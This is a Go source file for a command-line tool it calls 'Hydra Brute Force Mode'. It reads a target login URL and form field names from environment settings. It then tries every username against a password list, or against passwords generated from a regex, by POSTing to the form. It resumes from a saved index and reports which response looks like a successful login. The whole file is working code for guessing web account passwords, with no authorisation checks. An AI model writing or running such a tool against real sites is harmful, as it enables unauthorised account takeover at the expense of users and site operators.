package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"hydra/internal/evaluator"
	"hydra/internal/fetcher"
	"hydra/internal/generator"

	"github.com/joho/godotenv"
)

func main() {
	// 1. Load .env
	err := godotenv.Load()
	if err != nil {
		log.Println("Warning: No .env file found, using system environment")
	}

	url := os.Getenv("HYDRA_URL")
	timeoutStr := os.Getenv("HYDRA_TIMEOUT")
	selector := os.Getenv("HYDRA_TARGET_SELECTOR")
	successText := os.Getenv("HYDRA_SUCCESS_TEXT")
	errorText := os.Getenv("HYDRA_ERROR_TEXT")
	userFile := os.Getenv("HYDRA_USER_FILE")
	passFile := os.Getenv("HYDRA_PASS_FILE")
	// Allow override via CLI argument for parallel execution
	if len(os.Args) > 1 {
		passFile = os.Args[1]
	}

	passRegex := os.Getenv("HYDRA_PASS_REGEX")
	genCountStr := os.Getenv("HYDRA_GEN_COUNT")

	if url == "" || selector == "" {
		log.Fatal("HYDRA_URL and HYDRA_TARGET_SELECTOR must be set in .env")
	}

	timeout, _ := strconv.Atoi(timeoutStr)
	if timeout == 0 {
		timeout = 5
	}

	genCount, _ := strconv.Atoi(genCountStr)

	// 2. Load lists
	users, err := readLines(userFile)
	if err != nil {
		log.Fatalf("Error reading users: %v", err)
	}

	passwords, _ := readLines(passFile)

	// Parse length from regex if possible
	defMin, defMax := 6, 10
	if passRegex != "" {
		if start := strings.Index(passRegex, "{"); start != -1 {
			if end := strings.Index(passRegex, "}"); end != -1 {
				parts := strings.Split(passRegex[start+1:end], ",")
				if len(parts) == 2 {
					if min, err := strconv.Atoi(parts[0]); err == nil {
						defMin = min
					}
					if max, err := strconv.Atoi(parts[1]); err == nil {
						defMax = max
					}
				} else if len(parts) == 1 {
					if n, err := strconv.Atoi(parts[0]); err == nil {
						defMin = n
						defMax = n
					}
				}
			}
		}
	}

	// Dynamic runtime generation - only if no password list was provided
	if len(passwords) == 0 && passRegex != "" && genCount > 0 {
		fmt.Printf("Dynamic generation enabled: %s (Count: %d, Range: %d-%d)\n", passRegex, genCount, defMin, defMax)
		for i := 0; i < genCount; i++ {
			var p string
			// Detect if strictly following the 4-char block pattern
			if strings.Contains(passRegex, "([a-z][A-Z][0-9][_])") {
				// For blocks, we translate length to block count if reasonable,
				// but here we keep simple logic or use the parsed length as block count if that's the intent.
				// Based on internal/generator, blocks = length param.
				p, _ = generator.GenerateByBlockPattern(defMin, defMax)
			} else {
				p, _ = generator.GenerateVaried(defMin, defMax)
			}
			passwords = append(passwords, p)
		}
	}

	// 3. Initialize Hydra components
	f := fetcher.NewFetcher(timeout)
	e := evaluator.NewEvaluator(selector)

	fmt.Printf("--- 🐲 Hydra Brute Force Mode ---\n")
	fmt.Printf("URL: %s\n", url)
	fmt.Printf("Users: %d, Passwords: %d\n", len(users), len(passwords))
	fmt.Printf("Success Text: [%s]\n", successText)
	fmt.Printf("Error Text: [%s]\n", errorText)
	fmt.Printf("---------------------------------\n")

	userField := os.Getenv("HYDRA_USER_FIELD")
	if userField == "" {
		userField = "username"
	}
	passField := os.Getenv("HYDRA_PASS_FIELD")
	if passField == "" {
		passField = "password"
	}

	// 4. State Management for Resuming
	stateFile := passFile + ".state"
	lastIdx := -1
	if data, err := os.ReadFile(stateFile); err == nil {
		if val, err := strconv.Atoi(strings.TrimSpace(string(data))); err == nil {
			lastIdx = val
			fmt.Printf("♻️  Resuming from index: %d\n", lastIdx+1)
		}
	}

	found := false
	for _, user := range users {
		for pIdx, pass := range passwords {
			if pIdx <= lastIdx {
				continue
			}

			fmt.Printf("Testing: %s:%s ... ", user, pass)

			data := make(map[string]string)
			// Handle multiple user fields
			for _, field := range strings.Split(userField, ",") {
				data[strings.TrimSpace(field)] = user
			}
			// Handle multiple password fields
			for _, field := range strings.Split(passField, ",") {
				data[strings.TrimSpace(field)] = pass
			}
			// Handle extra params
			extraParams := os.Getenv("HYDRA_EXTRA_PARAMS")
			if extraParams != "" {
				for _, pair := range strings.Split(extraParams, ",") {
					parts := strings.SplitN(pair, "=", 2)
					if len(parts) == 2 {
						data[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
					}
				}
			}

			content, err := f.FetchPost(url, data)

			if err != nil {
				fmt.Printf("[NETWORK ERROR: %v]\n", err)
				continue
			}

			result, err := e.Elevate(content)
			if err != nil {
				fmt.Printf("[EVAL ERROR: %v]\n", err)
				continue
			}

			// Update state
			_ = os.WriteFile(stateFile, []byte(strconv.Itoa(pIdx)), 0644)

			cleanResult := strings.TrimSpace(result)

			// Categorization logic
			if successText != "" && strings.Contains(cleanResult, successText) {
				fmt.Printf("✅ SUCCESS!\n")
				fmt.Printf(">> Response: %s\n", cleanResult)
				// Clear state on success
				_ = os.Remove(stateFile)
				found = true
				break
			} else if errorText != "" && strings.Contains(cleanResult, errorText) {
				fmt.Printf("❌ FAILED (Known Denial)\n")
			} else {
				fmt.Printf("❓ UNKNOWN RESPONSE (Potential Success?)\n")
				fmt.Printf(">> Captured: %s\n", cleanResult)
			}

		}
		if found {
			break
		}
	}

	fmt.Printf("---------------------------------\n")
	fmt.Printf("Scan complete.\n")
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}
